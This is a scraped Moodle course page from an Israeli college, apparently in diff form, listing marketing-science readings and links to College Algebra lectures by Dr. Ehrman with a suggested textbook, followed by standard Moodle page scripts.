+<p><a href="http://moodle.jct.ac.il/pluginfile.php/169582/block_html/content/Marketing_Science-An_Overview.pdf">Marketing Science An&nbsp;Overview</a><br></p><p><a href="http://moodle.jct.ac.il/pluginfile.php/169582/block_html/content/%D7%A1%D7%98%D7%98%D7%99%D7%A1%D7%98%D7%99%D7%A7%D7%94.pdf">סטטיסטיקה ומדעי השיווק</a><br></p><p><br></p><p><br></p>
+<p></p>
+<p style="text-align: center;"><span style="font-size: large;"><strong><span style="text-decoration: underline;"><em><b><u><span style="font-size:20.0pt;font-family:
+&quot;Calibri&quot;,&quot;sans-serif&quot;;color:black">Lectures by Dr. Ehrman for College Algebra</span></u></b></em><br></span></strong></span></p><div class="editor-indent" style="margin-right: 30px;"><p><br></p></div><div class="WordSection1">
+
+<p class="MsoNormal" style="text-align: left;">Suggested Text (though not required)</p>
+
+<p class="MsoNormal" style="text-align: left;"><b><i><u>College Algebra and Triginometry </u></i></b>3<sup>rd</sup>
+Edition</p>
+
+<p class="MsoNormal" style="text-align: left;">Authors:<span style="mso-spacerun:yes">&nbsp; </span>J.S.Ratti
+and Marcus McWaters</p>
+
+<p class="MsoNormal" style="text-align: left;">Pearson Publishing, date of publishing, 2015</p>
+
+<p class="MsoNormal" style="text-align: left;"><a href="http://www.pearsonglobaleditions.com">www.pearsonglobaleditions.com</a></p>
+
+<p class="MsoNormal" style="text-align: left;">ISBN 978-0-321-86741 -4</p>
+
+<p class="MsoNormal" style="text-align: left;"><b><i><u>3 Links to his LECTURES<o:p></o:p></u></i></b></p>
+
+<p class="MsoListParagraphCxSpFirst" style="text-align: left; margin-left: 35.7pt; text-indent: -17.85pt; line-height: 150%;"><b><span style="mso-bidi-font-family:Calibri;mso-bidi-theme-font:minor-latin"><span style="mso-list:Ignore"><span style="font:7.0pt &quot;Times New Roman&quot;">&nbsp; &nbsp; &nbsp;&nbsp;</span></span></span></b><!--[endif]--><span dir="LTR"></span><b><a href="https://drive.google.com/open?id=0B1zFewqnDt0tTDQwYzE5YTFxTlU">Unit 4 –
+Exponential Functions and Logarithms</a><o:p></o:p></b></p>
+
+<p class="MsoListParagraphCxSpMiddle" style="text-align: left; margin-left: 35.7pt; text-indent: -17.85pt; line-height: 150%;"><b><span style="mso-bidi-font-family:Calibri;mso-bidi-theme-font:minor-latin"><span style="mso-list:Ignore"><span style="font:7.0pt &quot;Times New Roman&quot;">&nbsp; &nbsp; &nbsp;</span></span></span></b><!--[endif]--><span dir="LTR"></span><b><a href="https://drive.google.com/open?id=0B1zFewqnDt0tdHo2U2k0QnZ0cVU">Units 8 –
+9 Equations and Inequalities; Matrices </a><o:p></o:p></b></p>
+
+<p class="MsoListParagraphCxSpMiddle" style="text-align: left; margin-left: 35.7pt; text-indent: -17.85pt; line-height: 150%;"><b><span style="mso-bidi-font-family:Calibri;mso-bidi-theme-font:minor-latin"><span style="mso-list:Ignore"><span style="font:7.0pt &quot;Times New Roman&quot;">&nbsp; &nbsp; &nbsp;</span></span></span></b><!--[endif]--><span dir="LTR"></span><b><a href="https://drive.google.com/open?id=0B1zFewqnDt0td0VQVFMxTHBMOGM">Units
+10-11 Conic Sections; Sequences, series, Probability</a><o:p></o:p></b></p>
+
+<p class="MsoListParagraphCxSpLast" style="text-align: left;"><b><o:p>&nbsp;</o:p></b></p>
+
+<p class="MsoNormal" style="text-align: left;"><b>!Special thanks to Shlomo Zelevich for his professional
+assistance<o:p></o:p></b></p>
+
+</div></div></div></div><span class="skip-block-to" id="sb-18"></span></aside>    </div>
+
+    <footer id="page-footer">
+        <div id="course-footer"></div>
+        <p class="helplink"></p>
+        <div class="logininfo">את/ה לא מחובר/ת (<a href="https://moodle.jct.ac.il/login/index.php">התחברות</a>)</div><div class="sitelink"><a title="Moodle" href="http://moodle.org/"><img src="http://moodle.jct.ac.il/theme/image.php/clean/core/1494315764/moodlelogo" alt="Moodle logo" /></a></div>    </footer>
+
+    <script type="text/javascript">
+//<![CDATA[
+var require = {
+    baseUrl : 'http://moodle.jct.ac.il/lib/requirejs.php/-1/',
+    // We only support AMD modules with an explicit define() statement.
+    enforceDefine: true,
+    skipDataMain: true,
+    waitSeconds : 0,
+
+    paths: {
+        jquery: 'http://moodle.jct.ac.il/lib/javascript.php/-1/lib/jquery/jquery-1.12.1.min',
+        jqueryui: 'http://moodle.jct.ac.il/lib/javascript.php/-1/lib/jquery/ui-1.11.4/jquery-ui.min',
+        jqueryprivate: 'http://moodle.jct.ac.il/lib/javascript.php/-1/lib/requirejs/jquery-private'
+    },
+
+    // Custom jquery config map.
+    map: {
+      // '*' means all modules will get 'jqueryprivate'
+      // for their 'jquery' dependency.
+      '*': { jquery: 'jqueryprivate' },
+
+      // 'jquery-private' wants the real jQuery module
+      // though. If this line was not here, there would
+      // be an unresolvable cyclic dependency.
+      jqueryprivate: { jquery: 'jquery' }
+    }
+};
+
+//]]>
+</script>
+<script type="text/javascript" src="http://moodle.jct.ac.il/lib/javascript.php/-1/lib/requirejs/require.min.js"></script>
+<script type="text/javascript">
+//<![CDATA[
+require(['core/first'], function() {
+;
+require(["block_navigation/navblock"], function(amd) { amd.init("160180"); });;
+require(["block_settings/settingsblock"], function(amd) { amd.init("160181", null); });;
+require(["core/notification"], function(amd) { amd.init(2, []); });;
+require(["core/log"], function(amd) { amd.setConfig({"level":"warn"}); });
+});
+//]]>
+</script>
+<script type="text/javascript" src="http://moodle.jct.ac.il/theme/javascript.php/clean/1494315764/footer"></script>
+<script type="text/javascript">
+//<![CDATA[
+M.str = {"moodle":{"lastmodified":"\u05e9\u05d9\u05e0\u05d5\u05d9 \u05d0\u05d7\u05e8\u05d5\u05df","name":"\u05e9\u05dd","error":"\u05d8\u05e2\u05d5\u05ea","info":"\u05de\u05d9\u05d3\u05e2","yes":"\u05db\u05df","no":"\u05dc\u05d0","viewallcourses":"\u05e6\u05e4\u05d9\u05d4 \u05d1\u05db\u05dc \u05d4\u05e7\u05d5\u05e8\u05e1\u05d9\u05dd","ok":"\u05d0\u05d9\u05e9\u05d5\u05e8","morehelp":"\u05e2\u05d6\u05e8\u05d4 \u05e0\u05d5\u05e1\u05e4\u05ea","loadinghelp":"\u05d8\u05d5\u05e2\u05df...","cancel":"\u05d1\u05d9\u05d8\u05d5\u05dc","confirm":"\u05d0\u05d9\u05e9\u05d5\u05e8","areyousure":"\u05d4\u05d0\u05dd \u05d0\u05ea\/\u05d4 \u05d1\u05d8\u05d5\u05d7\/\u05d4?","closebuttontitle":"\u05e1\u05d2\u05d9\u05e8\u05d4","unknownerror":"\u05e9\u05d2\u05d9\u05d0\u05d4 \u05dc\u05d0 \u05d9\u05d3\u05d5\u05e2\u05d4"},"repository":{"type":"\u05e1\u05d5\u05d2","size":"\u05d2\u05d5\u05d3\u05dc","invalidjson":"\u05ea\u05e7\u05dc\u05ea \u05ea\u05e7\u05e9\u05d5\u05e8\u05ea. \u05d0\u05e0\u05d0 \u05d4\u05ea\u05d7\u05d1\u05e8\u05d5 \u05e9\u05d5\u05d1 \u05dc\u05de\u05e2\u05e8\u05db\u05ea.","nofilesattached":"\u05dc\u05d0 \u05e0\u05d1\u05d7\u05e8\u05d5 \u05e7\u05d1\u05e6\u05d9\u05dd","filepicker":"\u05d1\u05d7\u05d9\u05e8\u05ea \u05e7\u05d5\u05d1\u05e5","logout":"\u05d4\u05ea\u05e0\u05ea\u05e7\u05d5\u05ea","nofilesavailable":"\u05de\u05d0\u05d2\u05e8 \u05d4\u05e7\u05d1\u05e6\u05d9\u05dd \u05e8\u05d9\u05e7","norepositoriesavailable":"\u05de\u05e6\u05d8\u05e2\u05e8\u05d9\u05dd, \u05d0\u05e3 \u05d0\u05d7\u05d3 \u05de\u05d4\u05de\u05d0\u05d2\u05e8\u05d9\u05dd \u05d4\u05e0\u05d5\u05db\u05d7\u05d9\u05d9\u05dd \u05e9\u05dc\u05da \u05d9\u05db\u05d5\u05dc \u05dc\u05d4\u05d7\u05d6\u05d9\u05e8 \u05e7\u05d1\u05e6\u05d9\u05dd \u05d1\u05ea\u05d1\u05e0\u05d9\u05ea \u05d4\u05de\u05d1\u05d5\u05e7\u05e9\u05ea","fileexistsdialogheader":"\u05e7\u05d1\u05e6\u05d9\u05dd \u05e7\u05d9\u05d9\u05de\u05d9\u05dd","fileexistsdialog_editor":"\u05e7\u05d5\u05d1\u05e5 \u05d1\u05e2\u05dc \u05e9\u05dd \u05d6\u05d4\u05d4 \u05e6\u05d5\u05e8\u05e3 \u05db\u05d1\u05e8 \u05dc\u05ea\u05d5\u05db\u05df \u05e9\u05d4\u05d9\u05e0\u05da \u05e2\u05d5\u05de\u05d3\/\u05ea \u05dc\u05e2\u05e8\u05d5\u05da.","fileexistsdialog_filemanager":"\u05e7\u05d5\u05d1\u05e5 \u05d1\u05e2\u05dc \u05e9\u05dd \u05d6\u05d4\u05d4 \u05e7\u05d9\u05d9\u05dd \u05d1\u05de\u05e2\u05e8\u05db\u05ea","renameto":"\u05e9\u05d9\u05e0\u05d5\u05d9 \u05e9\u05dd \u05dc: \"{$a}\"","referencesexist":"{$a} \u05e7\u05d1\u05e6\u05d9\u05dd \u05de\u05e7\u05d5\u05e9\u05e8\u05d9\u05dd \u05dc\u05e7\u05d5\u05d1\u05e5 \u05d6\u05d4, \u05d4\u05de\u05e9\u05de\u05e9 \u05db\u05de\u05e7\u05d5\u05e8 \u05e9\u05dc\u05d4\u05dd","select":"\u05d1\u05d7\u05d9\u05e8\u05d4"},"admin":{"confirmdeletecomments":"\u05d4\u05d9\u05e0\u05da \u05e2\u05d5\u05de\u05d3 \u05dc\u05de\u05d7\u05d5\u05e7 \u05d4\u05e2\u05e8\u05d5\u05ea, \u05d4\u05d0\u05dd \u05d0\u05ea\u05d4 \u05d1\u05d8\u05d5\u05d7?","confirmation":"\u05d0\u05d9\u05e9\u05d5\u05e8"},"block":{"addtodock":"\u05d4\u05e2\u05d1\u05e8\u05ea \u05de\u05e9\u05d1\u05e6\u05ea \u05d6\u05d5 \u05dc\u05e1\u05e8\u05d2\u05dc\u05be\u05d4\u05e6\u05d3\u05d3\u05d9","undockitem":"\u05d4\u05e1\u05e8\u05ea \u05de\u05e9\u05d1\u05e6\u05ea \u05d6\u05d5 \u05de\u05d4\u05e1\u05e8\u05d2\u05dc\u05be\u05d4\u05e6\u05d3\u05d3\u05d9","dockblock":"\u05d4\u05e2\u05d1\u05e8\u05ea \u05d0\u05ea \u05de\u05e9\u05d1\u05e6\u05ea {$a} \u05dc\u05e1\u05e8\u05d2\u05dc \u05d4\u05e6\u05d3\u05d3\u05d9","undockblock":"\u05d4\u05d7\u05d6\u05e8\u05ea \u05de\u05e9\u05d1\u05e6\u05ea {$a} \u05de\u05d4\u05e1\u05e8\u05d2\u05dc \u05d4\u05e6\u05d3\u05d3\u05d9","undockall":"\u05d4\u05e1\u05e8\u05ea \u05db\u05dc \u05d4\u05de\u05e9\u05d1\u05e6\u05d5\u05ea \u05de\u05d4\u05e1\u05e8\u05d2\u05dc\u05be\u05d4\u05e6\u05d3\u05d3\u05d9","hidedockpanel":"\u05d4\u05e1\u05ea\u05e8\u05ea \u05e1\u05e8\u05d2\u05dc-\u05d4\u05e6\u05d3","hidepanel":"\u05d4\u05e1\u05ea\u05e8\u05ea \u05d4\u05e1\u05e8\u05d2\u05dc-\u05e6\u05d3"},"langconfig":{"thisdirectionvertical":"ttb"}};
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+(function() {M.util.load_flowplayer();
+setTimeout("fix_column_widths()", 20);
+Y.use("moodle-core-dock-loader",function() {M.core.dock.loader.initLoader();
+});
+Y.use("moodle-filter_glossary-autolinker",function() {M.filter_glossary.init_filter_autolinking({"courseid":0});
+});
+Y.use("moodle-filter_mathjaxloader-loader",function() {M.filter_mathjaxloader.configure({"mathjaxconfig":"MathJax.Hub.Config({\r\n    config: [\"Accessible.js\", \"Safe.js\"],\r\n    errorSettings: { message: [\"!\"] },\r\n    skipStartupTypeset: true,\r\n    messageStyle: \"none\"\r\n});\r\n","lang":"he"});
+});
+M.util.help_popups.setup(Y);
+Y.use("moodle-core-popuphelp",function() {M.core.init_popuphelp();
+});
+M.util.init_skiplink(Y);
+Y.use("moodle-core-formautosubmit",function() {M.core.init_formautosubmit({"selectid":"single_select59523d8ff05a15","nothing":false});
+});
+Y.use("moodle-core-formautosubmit",function() {M.core.init_formautosubmit({"selectid":"single_select59523d8ff05a17","nothing":false});
+});
+M.util.init_block_hider(Y, {"id":"inst29956","title":"\u05d1\u05e8\u05d5\u05db\u05d9\u05dd \u05d4\u05d1\u05d0\u05d9\u05dd","preference":"block29956hidden","tooltipVisible":"\u05d4\u05e1\u05ea\u05e8\u05ea \u05de\u05e9\u05d1\u05e6\u05ea \u05d1\u05e8\u05d5\u05db\u05d9\u05dd \u05d4\u05d1\u05d0\u05d9\u05dd","tooltipHidden":"\u05d4\u05e6\u05d2\u05ea \u05de\u05e9\u05d1\u05e6\u05ea \u05d1\u05e8\u05d5\u05db\u05d9\u05dd \u05d4\u05d1\u05d0\u05d9\u05dd"});
+M.util.init_block_hider(Y, {"id":"inst21655","title":"\u05d4\u05ea\u05d7\u05d1\u05e8\u05d5\u05ea","preference":"block21655hidden","tooltipVisible":"\u05d4\u05e1\u05ea\u05e8\u05ea \u05de\u05e9\u05d1\u05e6\u05ea \u05d4\u05ea\u05d7\u05d1\u05e8\u05d5\u05ea","tooltipHidden":"\u05d4\u05e6\u05d2\u05ea \u05de\u05e9\u05d1\u05e6\u05ea \u05d4\u05ea\u05d7\u05d1\u05e8\u05d5\u05ea"});
+M.util.init_block_hider(Y, {"id":"inst125788","title":"Marketing Science An Overview","preference":"block125788hidden","tooltipVisible":"\u05d4\u05e1\u05ea\u05e8\u05ea \u05de\u05e9\u05d1\u05e6\u05ea Marketing Science An Overview","tooltipHidden":"\u05d4\u05e6\u05d2\u05ea \u05de\u05e9\u05d1\u05e6\u05ea Marketing Science An Overview"});
+ M.util.js_pending('random59523d8ff05a111'); Y.on('domready', function() { M.util.js_complete("init");  M.util.js_complete('random59523d8ff05a111'); });
+})();
+//]]>
+</script>
+
+</div>
+</body>
+</html>
